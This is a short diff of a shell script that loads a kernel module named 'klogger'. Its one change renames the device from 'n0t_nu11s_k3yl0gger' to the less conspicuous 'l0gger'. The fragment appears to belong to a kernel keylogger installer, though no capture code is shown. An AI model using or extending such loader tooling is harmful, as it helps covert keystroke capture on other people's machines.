@@ -3,7 +3,7 @@
 INSMOD=`which insmod`
 MODULE=klogger
 MAJOR=60
-DEV=n0t_nu11s_k3yl0gger
+DEV=l0gger
 MODE=700
 
 echo "Loading module .."
